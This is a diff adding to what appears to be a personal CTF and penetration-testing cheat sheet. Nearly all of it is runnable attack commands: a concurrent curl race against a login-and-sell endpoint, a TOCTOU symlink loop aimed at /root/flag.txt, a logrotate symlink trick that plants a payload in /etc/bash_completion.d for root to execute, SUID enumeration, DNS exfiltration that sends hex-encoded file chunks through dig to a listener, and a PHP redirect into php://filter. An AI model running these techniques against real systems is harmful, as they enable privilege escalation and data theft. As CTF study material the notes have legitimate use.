@@ -7,20 +7,47 @@ cookie1="PHPSESSID=3k21rt4acut215r1adlrq5m0p0"
 cookie2="PHPSESSID=ck8pgb52nkkb8sdg2c95ms7s16"
 url="http://202.120.7.197/app.php"
 
-curl "$url?action=login" -b $cookie1 -d "username=$username&pwd=$password" &\
+curl "$url?action=login" -b $cookie1 -d "username=$username&pwd=$password" &
 curl "$url?action=login" -b $cookie2 -d "username=$username&pwd=$password"
 
 curl "$url?action=buy&id=1" -b $cookie1
 
-curl "$url?action=sale&id=1" -b $cookie1 &\
+curl "$url?action=sale&id=1" -b $cookie1 &
 curl "$url?action=sale&id=1" -b $cookie2
 ```
     - [Temmo's Tiny Shop - 0CTF 2017](https://www.40huo.cn/blog/0ctf-2017-writeup.html)
+
+- https://github.com/saw-your-packet/ctfs/blob/master/DarkCTF/Write-ups.md#-chain-race
+    - ~/share/ctf/darkctf2020/chain-race/
+
+### TOCTOU
+
+```bash
+while true; do
+    dd if=/dev/urandom count=$((1024 * 20)) bs=1024 > bigfile
+    chmod 777 bigfile
+    /exploitable bigfile &
+    ln -sf /root/flag.txt bigfile
+    sleep 0.1
+    rm -f bigfile
+done
+```
+    - https://github.com/kahla-sec/CTF-Writeups/blob/master/DarkCTF2020/McQueen.md
 
 ### symlink
 
 - [Book \- HackThebox | Samir Ettali](https://samirettali.com/writeups/hackthebox/book/)
     - https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition
+        ```bash
+        # logrotate: stat /tmp/logs/file.log
+        # attacker:
+        mv /tmp/logs /tmp/logs2
+        ln -s /etc/bash_completion.d /tmp/logs
+        # logrotate: create+chown /tmp/logs/file.log
+        # attacker:
+        echo 'payload' > /tmp/logs/file.log
+        # On root login, payload executed
+        ```
 
 # priviledge escalation
 
@@ -32,4 +59,41 @@ curl "$url?action=sale&id=1" -b $cookie2
     # || tar
     # || /lib/ld-musl-x86_64.so.1 /bin/busybox cat
     # || setpriv /bin/busybox cat
+    ```
+
+### enumeration
+
+- ~/opt/privilege-escalation-awesome-scripts-suite/
+- ~/opt/LinEnum/
+
+```bash
+# suid
+find / -perm -u=s -type f 2>/dev/null
+```
+
+# data exfiltration
+
+- DNS
+    - https://www.aldeid.com/wiki/File-transfer-via-DNS
+        ```bash
+        # 1. server
+        sudo tcpdump -i eth1 -s0 -w loremipsum.pcap 'port 53 and host 192.168.1.29'
+        # 2. client
+        for b in `cat loremipsum.hex`; do dig @192.168.1.23 $b.fakednsrequest.com; done
+        # 3. server
+        tcpdump -n -r loremipsum.pcap 'host 192.168.1.29 and host 192.168.1.23' \
+            | grep fakednsrequest \
+            | cut -d ' ' -f 8 \
+            | cut -d '.' -f 1 \
+            | uniq \
+            | xxd -r -p > loremipsum.txt
+        ```
+    - https://github.com/leonjza/dnsfilexfer
+- URI scheme
+    - file, ftp, zlib, data, glob, phar, ssh2, rar, ogg, ftps, compress.zlib, compress.bzip2, zip
+    ```php
+    <?php
+    header('HTTP/1.1 301 Redirect');
+    header('Location: php://filter/string.toupper/resource=index.php');
+    ?>
     ```
